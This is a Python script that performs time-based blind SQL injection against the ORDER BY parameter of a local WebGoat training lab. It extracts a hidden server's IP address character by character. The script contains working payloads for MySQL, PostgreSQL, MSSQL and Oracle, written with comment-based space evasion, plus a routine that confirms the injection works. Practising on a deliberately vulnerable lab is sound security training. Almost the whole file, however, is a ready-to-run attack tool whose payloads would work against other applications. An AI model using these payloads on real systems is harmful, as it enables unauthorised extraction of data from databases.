#!/usr/bin/env python3
import requests
import time
import statistics

# ─── HELPERS ────────────────────────────────────────────────────────────────

def measure_response_time(url: str, params: dict, cookies: dict, timeout: int = 10) -> float:
    """
    Measures the response time for a request.
    Returns the time in seconds.
    """
    start_time = time.time()
    try:
        r = requests.get(url, params=params, cookies=cookies, timeout=timeout)
        end_time = time.time()
        response_time = end_time - start_time
        print(f"DEBUG: HTTP Status: {r.status_code}, Response time: {response_time:.3f}s")
        return response_time
    except requests.exceptions.Timeout:
        print("DEBUG: Request timed out")
        return timeout  # Return timeout value if request times out
    except requests.exceptions.RequestException as e:
        print(f"DEBUG: Request failed: {e}")
        end_time = time.time()
        return end_time - start_time

def is_response_delayed(response_time: float, baseline_time: float, delay_threshold: float = 3.0) -> bool:
    """
    Determines if a response was delayed based on baseline timing.
    Returns True if the response took significantly longer than baseline.
    """
    delay_detected = response_time > (baseline_time + delay_threshold)
    print(f"DEBUG: Response time: {response_time:.3f}s, Baseline: {baseline_time:.3f}s, Delayed: {delay_detected}")
    return delay_detected

def get_baseline_time(url: str, cookies: dict, samples: int = 3) -> float:
    """
    Gets baseline response time by making normal requests.
    Returns the median response time from multiple samples.
    """
    print("DEBUG: Measuring baseline response time...")
    times = []
    
    for _ in range(samples):
        # Normal request with a simple ORDER BY
        params = {"column": "hostname", "direction": "asc"}
        response_time = measure_response_time(url, params, cookies)
        times.append(response_time)
        time.sleep(0.5)  # Small delay between requests
    
    baseline = statistics.median(times)
    print(f"DEBUG: Baseline time calculated: {baseline:.3f}s (from {len(times)} samples)")
    return baseline

# ─── CONFIG ────────────────────────────────────────────────────────────────

BASE_URL = "http://localhost:8080/WebGoat/SqlInjectionMitigations/servers"
COOKIE   = {"JSESSIONID": "EFFB385BBF7C53A06493297C10CA02D8"}
CHARSET  = "0123456789."   # digits + dot
MAX_POS  = 15              # extended range for full IP
DELAY_SECONDS = 5          # delay time for sleep injection

def test_ip_char_timing(pos: int, ch: str, baseline_time: float) -> bool:
    """
    Uses timing-based SQL injection to test if a character at a position matches.
    Injects a CASE WHEN with SLEEP/WAITFOR to cause delays when condition is true.
    """
    # MySQL/MariaDB timing injection with SLEEP()
    inj = (
        "CASE/**/WHEN/**/"
        f"substring((SELECT/**/ip/**/FROM/**/servers"
        f"/**/WHERE/**/hostname='webgoat-prd'),{pos},1)='{ch}'"
        f"/**/THEN/**/(SELECT/**/SLEEP({DELAY_SECONDS}))"
        "/**/ELSE/**/hostname/**/END"
    )
    
    print(f"DEBUG: Testing pos={pos}, ch='{ch}'")
    print(f"DEBUG: Timing injection payload: {inj}")
    
    params = {"column": inj, "direction": "asc"}
    response_time = measure_response_time(BASE_URL, params, COOKIE, timeout=15)
    
    return is_response_delayed(response_time, baseline_time, delay_threshold=DELAY_SECONDS - 1)

def test_ip_char_timing_postgres(pos: int, ch: str, baseline_time: float) -> bool:
    """
    PostgreSQL version using pg_sleep().
    """
    inj = (
        "CASE/**/WHEN/**/"
        f"substring((SELECT/**/ip/**/FROM/**/servers"
        f"/**/WHERE/**/hostname='webgoat-prd'),{pos},1)='{ch}'"
        f"/**/THEN/**/(SELECT/**/pg_sleep({DELAY_SECONDS}))"
        "/**/ELSE/**/hostname/**/END"
    )
    
    print(f"DEBUG: Testing pos={pos}, ch='{ch}' (PostgreSQL)")
    print(f"DEBUG: Timing injection payload: {inj}")
    
    params = {"column": inj, "direction": "asc"}
    response_time = measure_response_time(BASE_URL, params, COOKIE, timeout=15)
    
    return is_response_delayed(response_time, baseline_time, delay_threshold=DELAY_SECONDS - 1)

def test_ip_char_timing_mssql(pos: int, ch: str, baseline_time: float) -> bool:
    """
    Microsoft SQL Server version using WAITFOR DELAY.
    """
    delay_string = f"00:00:0{DELAY_SECONDS}"  # Format: HH:MM:SS
    inj = (
        "CASE/**/WHEN/**/"
        f"substring((SELECT/**/ip/**/FROM/**/servers"
        f"/**/WHERE/**/hostname='webgoat-prd'),{pos},1)='{ch}'"
        f"/**/THEN/**/(SELECT/**/1/**/WHERE/**/1=1/**/WAITFOR/**/DELAY/**/'{delay_string}')"
        "/**/ELSE/**/hostname/**/END"
    )
    
    print(f"DEBUG: Testing pos={pos}, ch='{ch}' (MS SQL Server)")
    print(f"DEBUG: Timing injection payload: {inj}")
    
    params = {"column": inj, "direction": "asc"}
    response_time = measure_response_time(BASE_URL, params, COOKIE, timeout=15)
    
    return is_response_delayed(response_time, baseline_time, delay_threshold=DELAY_SECONDS - 1)

def test_ip_char_timing_oracle(pos: int, ch: str, baseline_time: float) -> bool:
    """
    Oracle version using DBMS_LOCK.SLEEP (requires privileges) or heavy computation.
    Using heavy computation approach for better compatibility.
    """
    # Heavy computation approach (10 million iterations)
    inj = (
        "CASE/**/WHEN/**/"
        f"substr((SELECT/**/ip/**/FROM/**/servers"
        f"/**/WHERE/**/hostname='webgoat-prd'),{pos},1)='{ch}'"
        "/**/THEN/**/(SELECT/**/COUNT(*)/**/FROM/**/ALL_OBJECTS,ALL_OBJECTS,ALL_OBJECTS)"
        "/**/ELSE/**/hostname/**/END"
    )
    
    print(f"DEBUG: Testing pos={pos}, ch='{ch}' (Oracle)")
    print(f"DEBUG: Timing injection payload: {inj}")
    
    params = {"column": inj, "direction": "asc"}
    response_time = measure_response_time(BASE_URL, params, COOKIE, timeout=30)
    
    return is_response_delayed(response_time, baseline_time, delay_threshold=2.0)

# ─── MAIN EXTRACTION ───────────────────────────────────────────────────────

def extract_prd_ip_timing(database_type: str = "mysql"):
    """
    Extract IP using timing-based SQL injection.
    
    Args:
        database_type: Type of database ("mysql", "postgres", "mssql", "oracle")
    """
    print(f"🔍 Starting timing-based SQL injection for {database_type.upper()}")
    
    # Get baseline response time
    baseline_time = get_baseline_time(BASE_URL, COOKIE)
    
    # Choose the appropriate test function based on database type
    test_functions = {
        "mysql": test_ip_char_timing,
        "postgres": test_ip_char_timing_postgres,
        "mssql": test_ip_char_timing_mssql,
        "oracle": test_ip_char_timing_oracle
    }
    
    test_function = test_functions.get(database_type.lower(), test_ip_char_timing)
    
    discovered_ip = ""
    
    for pos in range(1, MAX_POS + 1):
        char_found = False
        
        for ch in CHARSET:
            print(f"\n--- Testing position {pos}, character '{ch}' ---")
            
            try:
                if test_function(pos, ch, baseline_time):
                    print(f"[+] Position {pos}: '{ch}' (DELAY DETECTED)")
                    discovered_ip += ch
                    char_found = True
                    break
                else:
                    print(f"[-] Position {pos}: '{ch}' (no delay)")
                    
            except Exception as e:
                print(f"[!] Error testing pos={pos}, ch='{ch}': {e}")
                continue
            
            # Add small delay between attempts to avoid overwhelming the server
            time.sleep(0.5)
        
        if not char_found:
            print(f"[-] No character found at position {pos}; stopping extraction.")
            break
        
        print(f"[*] Current discovered IP: {discovered_ip}")
    
    print(f"\n✅ Final discovered webgoat-prd IP: {discovered_ip}")
    return discovered_ip

def test_timing_attack_detection():
    """
    Test function to verify timing attack is working.
    Tests a known true and false condition to verify delay detection.
    """
    print("🧪 Testing timing attack detection...")
    
    baseline_time = get_baseline_time(BASE_URL, COOKIE)
    
    # Test with a condition that should be true (assuming webgoat-prd exists)
    print("\n--- Testing TRUE condition ---")
    true_inj = (
        "CASE/**/WHEN/**/"
        "(SELECT/**/COUNT(*)/**/FROM/**/servers/**/WHERE/**/hostname='webgoat-prd')>0"
        f"/**/THEN/**/(SELECT/**/SLEEP({DELAY_SECONDS}))"
        "/**/ELSE/**/hostname/**/END"
    )
    
    params = {"column": true_inj, "direction": "asc"}
    true_time = measure_response_time(BASE_URL, params, COOKIE, timeout=15)
    true_delayed = is_response_delayed(true_time, baseline_time, delay_threshold=DELAY_SECONDS - 1)
    
    time.sleep(1)
    
    # Test with a condition that should be false
    print("\n--- Testing FALSE condition ---")
    false_inj = (
        "CASE/**/WHEN/**/"
        "(SELECT/**/COUNT(*)/**/FROM/**/servers/**/WHERE/**/hostname='nonexistent-server')>0"
        f"/**/THEN/**/(SELECT/**/SLEEP({DELAY_SECONDS}))"
        "/**/ELSE/**/hostname/**/END"
    )
    
    params = {"column": false_inj, "direction": "asc"}
    false_time = measure_response_time(BASE_URL, params, COOKIE, timeout=15)
    false_delayed = is_response_delayed(false_time, baseline_time, delay_threshold=DELAY_SECONDS - 1)
    
    print("\n📊 Results:")
    print(f"   Baseline time: {baseline_time:.3f}s")
    print(f"   True condition: {true_time:.3f}s (delayed: {true_delayed})")
    print(f"   False condition: {false_time:.3f}s (delayed: {false_delayed})")
    
    if true_delayed and not false_delayed:
        print("✅ Timing attack detection is working correctly!")
        return True
    else:
        print("❌ Timing attack detection may not be working properly.")
        print("   This could be due to network latency, server load, or WAF protection.")
        return False

if __name__ == "__main__":
    import sys
    
    print("🕰️  Timing-Based Blind SQL Injection Tool")
    print("=" * 50)
    
    if len(sys.argv) > 1:
        if sys.argv[1] == "test":
            test_timing_attack_detection()
        elif sys.argv[1] in ["mysql", "postgres", "mssql", "oracle"]:
            extract_prd_ip_timing(sys.argv[1])
        else:
            print("Usage: python3 timing_sqli.py [mysql|postgres|mssql|oracle|test]")
    else:
        # Default to MySQL/MariaDB
        if test_timing_attack_detection():
            print("\n" + "=" * 50)
            extract_prd_ip_timing("mysql")
